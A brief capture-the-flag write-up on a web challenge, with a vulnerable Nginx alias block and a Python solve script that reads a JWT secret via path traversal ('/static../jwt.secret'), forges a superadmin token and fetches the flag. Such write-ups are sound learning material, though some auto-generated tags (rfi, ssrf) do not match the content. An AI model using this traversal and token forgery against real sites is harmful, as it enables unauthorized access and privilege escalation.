---
ai_date: '2025-04-27 05:14:08'
ai_summary: Misconfigured Nginx alias allowed directory traversal in static files
  leading to JWT secret exposure and privilege escalation.
ai_tags:
- lfi
- rfi
- ssrf
created: 2024-09-01T17:04
updated: 2024-09-01T17:06
---

After the event ended I found out that nginx misconfiguration was the solution.

😭 its nginx agian!

```nginx
location /static {
	alias /app/static/;
}
```

## solve script

```python
import re
import jwt
import requests
s = requests.Session()
t = "https://14ae2eb9-b747-42c1-9694-ee6dc5bf0b39.bugg.cc"
sec = s.get(t+"/static../jwt.secret").text
print(sec)
print(s.post(t+"/register", json={"username": "kumo", "password": "kumo"}))
print(s.post(t+"/login", json={"username": "kumo", "password": "kumo"}))
aT = s.cookies.get_dict()['accesstoken']
data = jwt.decode(aT, sec, algorithms=["HS256"])
data['role'] = 'superadmin'
aT = jwt.encode(data, sec, algorithm="HS256")
s.cookies.set('accesstoken', aT, domain="14ae2eb9-b747-42c1-9694-ee6dc5bf0b39.bugg.cc")
pid = re.search(r"<td>Welcome to the CTF!</td>\s*<td>(.+)</td>", s.get(t+"/admin/dashboard").text).group(1)
print(s.get(t+"/user/posts/"+pid).text)
```

```flag
CSCTF{0a97afb3-64be-4d96-aa52-86a91a2a3c52}
```